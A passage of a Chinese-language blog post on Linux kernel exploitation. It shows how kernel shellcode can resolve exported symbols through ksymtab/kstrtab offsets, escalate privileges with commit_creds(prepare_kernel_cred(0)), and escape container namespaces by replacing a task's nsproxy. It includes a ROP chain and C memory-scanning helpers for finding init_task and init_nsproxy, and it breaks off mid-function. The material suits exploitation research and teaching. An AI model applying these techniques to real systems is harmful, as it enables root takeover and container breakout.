<h2 id="0x02-ksymtab-make-shellcode-great-again"><a href="#0x02-ksymtab-make-shellcode-great-again" class="headerlink" title="0x02. ksymtab make shellcode great again"></a>0x02. ksymtab make shellcode great again</h2><p>现在的问题转换成如果有了往内核注入一段任意shellcode并执行之的能力，能否完成提权并完成 namespace 逃逸？我马上想起了之前调试eBPF漏洞时的经历。</p>
<p>eBPF漏洞往往是绕过校验，让其能够加载任意的eBPF代码，这样就可以通过eBPF构造出内核任意地址读写的能力。借助任意地址读写，就能通过ksymtab和kstrtab两张表中的某些关系作为特征，找到init_pid_ns的地址，之后通过pid和init_pid_ns来模拟内核调用find_task_by_pid_ns函数查找task_struct的逻辑；再在task_struct中找到cred地址并修改其中的uid和euid等来进行提权。</p>
<p>先说说为什么能够通过ksymtab和kstrtab两张表来找到 init_pid_ns 的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * PID-map pages start out as NULL, they get allocated upon</span></span><br><span class="line"><span class="comment"> * first use and are never deallocated. This way a low pid_max</span></span><br><span class="line"><span class="comment"> * value does not cause lots of bitmaps to be allocated, but</span></span><br><span class="line"><span class="comment"> * the scheme scales to up to 4 million PIDs, runtime.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span> <span class="title">init_pid_ns</span> =</span> &#123;</span><br><span class="line">	.ns.count = REFCOUNT_INIT(<span class="number">2</span>),</span><br><span class="line">	.idr = IDR_INIT(init_pid_ns.idr),</span><br><span class="line">	.pid_allocated = PIDNS_ADDING,</span><br><span class="line">	.level = <span class="number">0</span>,</span><br><span class="line">	.child_reaper = &amp;init_task,</span><br><span class="line">	.user_ns = &amp;init_user_ns,</span><br><span class="line">	.ns.inum = PROC_PID_INIT_INO,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PID_NS</span></span><br><span class="line">	.ns.ops = &amp;pidns_operations,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_SYMBOL_GPL(init_pid_ns);</span><br></pre></td></tr></table></figure>

<p>注意到 init_pid_ns 后面跟着一行<code>EXPORT_SYMBOL_GPL(init_pid_ns);</code>，这表示这个符号被导出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  include/linux/export.h</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXPORT_SYMBOL_GPL(sym)		_EXPORT_SYMBOL(sym, <span class="string">&quot;_gpl&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _EXPORT_SYMBOL(sym, sec)	__EXPORT_SYMBOL(sym, sec, <span class="string">&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For every exported symbol, do the following:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - If applicable, place a CRC entry in the __kcrctab section.</span></span><br><span class="line"><span class="comment"> * - Put the name of the symbol and namespace (empty string &quot;&quot; for none) in</span></span><br><span class="line"><span class="comment"> *   __ksymtab_strings.</span></span><br><span class="line"><span class="comment"> * - Place a struct kernel_symbol entry in the __ksymtab section.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * note on .section use: we specify progbits since usage of the &quot;M&quot; (SHF_MERGE)</span></span><br><span class="line"><span class="comment"> * section flag requires it. Use &#x27;%progbits&#x27; instead of &#x27;@progbits&#x27; since the</span></span><br><span class="line"><span class="comment"> * former apparently works on all arches according to the binutils source.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ___EXPORT_SYMBOL(sym, sec, ns)						\</span></span><br><span class="line"><span class="meta">	extern typeof(sym) sym;							\</span></span><br><span class="line"><span class="meta">	extern const char __kstrtab_##sym[];					\</span></span><br><span class="line"><span class="meta">	extern const char __kstrtabns_##sym[];					\</span></span><br><span class="line"><span class="meta">	__CRC_SYMBOL(sym, sec);							\</span></span><br><span class="line"><span class="meta">	asm(<span class="string">&quot;	.section \&quot;__ksymtab_strings\&quot;,\&quot;aMS\&quot;,%progbits,1	\n&quot;</span>	\</span></span><br><span class="line"><span class="meta">	    <span class="string">&quot;__kstrtab_&quot;</span> #sym <span class="string">&quot;:					\n&quot;</span>	\</span></span><br><span class="line"><span class="meta">	    <span class="string">&quot;	.asciz 	\&quot;&quot;</span> #sym <span class="string">&quot;\&quot;					\n&quot;</span>	\</span></span><br><span class="line"><span class="meta">	    <span class="string">&quot;__kstrtabns_&quot;</span> #sym <span class="string">&quot;:					\n&quot;</span>	\</span></span><br><span class="line"><span class="meta">	    <span class="string">&quot;	.asciz 	\&quot;&quot;</span> ns <span class="string">&quot;\&quot;					\n&quot;</span>	\</span></span><br><span class="line"><span class="meta">	    <span class="string">&quot;	.previous						\n&quot;</span>);	\</span></span><br><span class="line"><span class="meta">	__KSYMTAB_ENTRY(sym, sec)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Emit the ksymtab entry as a pair of relative references: this reduces</span></span><br><span class="line"><span class="comment"> * the size by half on 64-bit architectures, and eliminates the need for</span></span><br><span class="line"><span class="comment"> * absolute relocations that require runtime processing on relocatable</span></span><br><span class="line"><span class="comment"> * kernels.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __KSYMTAB_ENTRY(sym, sec)					\</span></span><br><span class="line"><span class="meta">	__ADDRESSABLE(sym)						\</span></span><br><span class="line"><span class="meta">	asm(<span class="string">&quot;	.section \&quot;___ksymtab&quot;</span> sec <span class="string">&quot;+&quot;</span> #sym <span class="string">&quot;\&quot;, \&quot;a\&quot;	\n&quot;</span>	\</span></span><br><span class="line"><span class="meta">	    <span class="string">&quot;	.balign	4					\n&quot;</span>	\</span></span><br><span class="line"><span class="meta">	    <span class="string">&quot;__ksymtab_&quot;</span> #sym <span class="string">&quot;:				\n&quot;</span>	\</span></span><br><span class="line"><span class="meta">	    <span class="string">&quot;	.long	&quot;</span> #sym <span class="string">&quot;- .				\n&quot;</span>	\</span></span><br><span class="line"><span class="meta">	    <span class="string">&quot;	.long	__kstrtab_&quot;</span> #sym <span class="string">&quot;- .			\n&quot;</span>	\</span></span><br><span class="line"><span class="meta">	    <span class="string">&quot;	.long	__kstrtabns_&quot;</span> #sym <span class="string">&quot;- .			\n&quot;</span>	\</span></span><br><span class="line"><span class="meta">	    <span class="string">&quot;	.previous					\n&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> value_offset;</span><br><span class="line">	<span class="type">int</span> name_offset;</span><br><span class="line">	<span class="type">int</span> namespace_offset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>简单来说，我们以 commit_creds 为例，第一个dword表示 commit_creds 和这个dword所在地址的偏移；第一个dword表示 kstrtab中的字符串 “commit_creds” 和这个dword所在地址的偏移。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__ksymtab:FFFFFFFF8271E4D4 __ksymtab_commit_creds dd 0FE9B37ACh</span><br><span class="line">__ksymtab:FFFFFFFF8271E4D8                 dd 2F4B9h</span><br><span class="line">__ksymtab:FFFFFFFF8271E4DC                 dd 34261h</span><br><span class="line"></span><br><span class="line">0xFFFFFFFF00000000 | (0xFFFFFFFF8271E4D4 + 0xFE9B37AC) == 0xffffffff810d1c80</span><br><span class="line">.text:FFFFFFFF810D1C80 commit_creds</span><br><span class="line">.text:FFFFFFFF810D1C80                 call    __fentry__</span><br><span class="line">.text:FFFFFFFF810D1C85                 push    rbp</span><br><span class="line">.text:FFFFFFFF810D1C86                 mov     rbp, rsp</span><br><span class="line"></span><br><span class="line">0xFFFFFFFF00000000 | (0xFFFFFFFF8271E4D8 + 0x2F4B9) == 0xffffffff8274d991</span><br><span class="line">__ksymtab_strings:FFFFFFFF8274D991 __kstrtab_commit_creds db &#x27;commit_creds&#x27;,0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因此在利用时，我们先在内核空间暴力搜索字符串”commit_creds”，commit_creds 的 strtab 地址，在通过关系 <code>&amp;symtab.name_offset + symtab.name_offset == &amp;strtab </code>找到 commit_creds 的 symtab 地址。之后通过加减 symtab.value_offset 就能得到 commit_creds 地址。</p>
<p>通过阅读内核代码，我发现 prepare_kernel_cred 和 commit_creds 均为导出函数，都可以通过上面的方法定位函数地址。因此如果我们的目标只是提权，只需要通过shellcode查找并调用这两个函数即可完成通用提权。</p>
<p>但如果想要改变namespace就没这么容易了。先看看平时用ROP逃逸namespace时都调用了那些函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> chain[] = &#123;</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    prepare_kernel_cred,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0xbaadbabe</span>,</span><br><span class="line">    cmov_rdi_rax_esi_nz_pop_rbp,</span><br><span class="line">    <span class="number">0xdeadbeef</span>,</span><br><span class="line">    commit_creds,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    find_task_by_vpid,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0xbaadbabe</span>,</span><br><span class="line">    cmov_rdi_rax_esi_nz_pop_rbp,</span><br><span class="line">    <span class="number">0xdeadbeef</span>,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    init_nsproxy,</span><br><span class="line">    switch_task_namespaces,</span><br><span class="line">    kpti_trampoline,</span><br><span class="line">    <span class="number">0xdeadbeef</span>,</span><br><span class="line">    <span class="number">0xbaadf00d</span>,</span><br><span class="line">    (<span class="type">uint64_t</span>)pwned,</span><br><span class="line">    user_cs,</span><br><span class="line">    user_rflags,</span><br><span class="line">    user_sp &amp; <span class="number">0xffffffffffffff00</span>,</span><br><span class="line">    user_ss,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line"><span class="comment"> * switch_task_namespaces(find_task_by_vpid(1), init_nsproxy);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>这下面的 switch_task_namespaces， find_task_by_vpid ，init_nsproxy 都不是导出的，都无法通过symtab找到。</p>
<p>不过也只是多绕几个弯的问题。</p>
<p>find_task_by_vpid 是通过pid找到对应的struct task_struct：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> task_struct *<span class="title function_">find_task_by_vpid</span><span class="params">(<span class="type">pid_t</span> vnr)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> find_task_by_pid_ns(vnr, task_active_pid_ns(current));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Must be called under rcu_read_lock().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> task_struct *<span class="title function_">find_task_by_pid_ns</span><span class="params">(<span class="type">pid_t</span> nr, <span class="keyword">struct</span> pid_namespace *ns)</span></span><br><span class="line">&#123;</span><br><span class="line">	RCU_LOCKDEP_WARN(!rcu_read_lock_held(),</span><br><span class="line">			 <span class="string">&quot;find_task_by_pid_ns() needs rcu_read_lock() protection&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> pid_task(find_pid_ns(nr, ns), PIDTYPE_PID);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过以下两个导出函数等价替换：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> pid *<span class="title function_">find_vpid</span><span class="params">(<span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> find_pid_ns(nr, task_active_pid_ns(current));</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(find_vpid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> task_struct *<span class="title function_">pid_task</span><span class="params">(<span class="keyword">struct</span> pid *pid, <span class="keyword">enum</span> pid_type type)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">result</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (pid) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> *<span class="title">first</span>;</span></span><br><span class="line">		first = rcu_dereference_check(hlist_first_rcu(&amp;pid-&gt;tasks[type]),</span><br><span class="line">					      lockdep_tasklist_lock_is_held());</span><br><span class="line">		<span class="keyword">if</span> (first)</span><br><span class="line">			result = hlist_entry(first, <span class="keyword">struct</span> task_struct, pid_links[(type)]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(pid_task);</span><br></pre></td></tr></table></figure>

<p>即：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find_task_by_vpid(<span class="number">1</span>) == pid_task(find_vpid(<span class="number">1</span>), PIDTYPE_PID)</span><br></pre></td></tr></table></figure>



<p>switch_task_namespaces 干的事情也很单一，如果我们能够知道 nsproxy 在 task_struct 中的偏移，只要用shellcode手动替换一下也是一样的，并不需要调用函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">switch_task_namespaces</span><span class="params">(<span class="keyword">struct</span> task_struct *p, <span class="keyword">struct</span> nsproxy *new)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span> *<span class="title">ns</span>;</span></span><br><span class="line"></span><br><span class="line">	might_sleep();</span><br><span class="line"></span><br><span class="line">	task_lock(p);</span><br><span class="line">	ns = p-&gt;nsproxy;</span><br><span class="line">	p-&gt;nsproxy = new;</span><br><span class="line">	task_unlock(p);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ns)</span><br><span class="line">		put_nsproxy(ns);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>init_nsproxy 的寻找就比较leet了。首先注意到 init_pid_ns 是导出的，起切中包含 init_task 的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span> <span class="title">init_pid_ns</span> =</span> &#123;</span><br><span class="line">	.ns.count = REFCOUNT_INIT(<span class="number">2</span>),</span><br><span class="line">	.idr = IDR_INIT(init_pid_ns.idr),</span><br><span class="line">	.pid_allocated = PIDNS_ADDING,</span><br><span class="line">	.level = <span class="number">0</span>,</span><br><span class="line">	.child_reaper = &amp;init_task,</span><br><span class="line">	.user_ns = &amp;init_user_ns,</span><br><span class="line">	.ns.inum = PROC_PID_INIT_INO,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PID_NS</span></span><br><span class="line">	.ns.ops = &amp;pidns_operations,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_SYMBOL_GPL(init_pid_ns);</span><br></pre></td></tr></table></figure>

<p>而 init_task 中又存在 init_nsproxy 的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> <span class="title">init_task</span></span></span><br><span class="line"><span class="class">#<span class="title">ifdef</span> <span class="title">CONFIG_ARCH_TASK_STRUCT_ON_STACK</span></span></span><br><span class="line"><span class="class">	__<span class="title">init_task_data</span></span></span><br><span class="line"><span class="class">#<span class="title">endif</span></span></span><br><span class="line"><span class="class">	__<span class="title">aligned</span>(<span class="title">L1_CACHE_BYTES</span>)</span></span><br><span class="line"><span class="class">=</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_THREAD_INFO_IN_TASK</span></span><br><span class="line">	.thread_info	= INIT_THREAD_INFO(init_task),</span><br><span class="line">	.stack_refcount	= REFCOUNT_INIT(<span class="number">1</span>),</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	.__state	= <span class="number">0</span>,</span><br><span class="line">	.<span class="built_in">stack</span>		= init_stack,</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    .real_parent	= &amp;init_task,</span><br><span class="line">	.parent		= &amp;init_task,</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    .nsproxy	= &amp;init_nsproxy,</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span> <span class="title">init_nsproxy</span> =</span> &#123;</span><br><span class="line">	.count			= ATOMIC_INIT(<span class="number">1</span>),</span><br><span class="line">	.uts_ns			= &amp;init_uts_ns,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_POSIX_MQUEUE) || defined(CONFIG_SYSVIPC)</span></span><br><span class="line">	.ipc_ns			= &amp;init_ipc_ns,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	.mnt_ns			= <span class="literal">NULL</span>,</span><br><span class="line">	.pid_ns_for_children	= &amp;init_pid_ns,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NET</span></span><br><span class="line">	.net_ns			= &amp;init_net,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CGROUPS</span></span><br><span class="line">	.cgroup_ns		= &amp;init_cgroup_ns,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TIME_NS</span></span><br><span class="line">	.time_ns		= &amp;init_time_ns,</span><br><span class="line">	.time_ns_for_children	= &amp;init_time_ns,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>因此，理论上，通过偏移我们是能够顺着 init_pid_ns 找到 init_nsproxy 的地址的。</p>
<p>但，这只是理论上。</p>
<p>从 init_pid_ns 摸到 init_task 没啥大问题，struct pid_namespace 基本不会发生代码变动，因此指针偏移可以认为不变。但从 struct task_struct 摸到 init_nsproxy 如果也直接通过偏移找就太不靠谱了，因为 struct task_struct 在不同版本间经常变动，且在同一版本中也会受不同编译参数的影响而发生变化。因此这里我依然打算通过指针间的特征来找。</p>
<p>首先是从init_pid_ns 寻找 init_task。所用的逻辑特征是 init_pid_ns 中存在一个指针p1，将其视为task_struct，其中包含自身地址p1。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> pid_namespace_approx_size (0xa0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> task_struct_approx_size (0x3000)</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">find_init_task</span><span class="params">(<span class="type">char</span> *init_pid_ns)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> *pos = init_pid_ns; pos &lt; init_pid_ns + pid_namespace_approx_size; pos++) &#123;</span><br><span class="line">        <span class="type">size_t</span> may_ptr = *pos;</span><br><span class="line">        <span class="keyword">if</span> ((may_ptr &amp; <span class="number">0xffff000000000000</span>) != <span class="number">0xffff000000000000</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *may_task = (<span class="type">char</span> *)may_ptr;</span><br><span class="line">        <span class="comment">// check task</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> *pos2 = may_task; pos2 &lt; may_task + task_struct_approx_size; pos2++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*pos2 == may_task) &#123;</span><br><span class="line">                <span class="keyword">return</span> may_task;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>从 init_task 找到 init_nsproxy的逻辑特征为 init_task 中存在一个指针p1，其不等于 init_task 自身，将其视为nsproxy，其中同时存在 init_pid_ns 和 init_uts_ns 两个指针。且通过这个特征可以得知nsproxy在task_struct中所在偏移，之后便可以通过shellcode直接对目标task struct的nsproxy进行修改。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> nsproxy_approx_size (0x60)</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">find_init_nsproxy</span><span class="params">(<span class="type">char</span> *init_pid_ns, <span class="type">char</span> *init_uts_ns, <span class="type">size_t</span> *nsproxy_offset)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *init_task = find_init_task(init_pid_ns);</span><br><span class="line">    <span class="keyword">if</span> (!init_task) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find init_nsproxy in init_task</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> *pos = init_task; pos &lt; init_task + task_struct_approx_size; pos++) &#123;</span><br><span class="line">        <span class="type">size_t</span> may_ptr = *pos;</span><br><span class="line">        <span class="keyword">if</span> ((may_ptr &amp; <span class="number">0xffff000000000000</span>) != <span class="number">0xffff000000000000</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (may_ptr == init_task) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// guess init_nsproxy</span></span><br><span class="line">        <span class="type">char</span> *may_nsproxy = may_ptr;</span><br><span class="line">        <span class="type">int</span> has_pid_ns = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> has_uts_ns = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> *pos2 = may_nsproxy; pos2 &lt; may_nsproxy + nsproxy_approx_size; pos2++) &#123;</span><br><span class="line">            <span class="type">size_t</span> may_ptr2 = *pos2;</span><br><span class="line">            <span class="keyword">if</span> (may_ptr2 == init_pid_ns) &#123;</span><br><span class="line">                has_pid_ns = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (may_ptr2 == init_uts_ns) &#123;</span><br><span class="line">                has_uts_ns = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (has_uts_ns &amp;&amp; has_pid_ns) &#123;</span><br><span class="line">                *nsproxy_offset = may_nsproxy - init_task;</span><br><span class="line">                <span class="keyword">return</span> may_nsproxy;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">  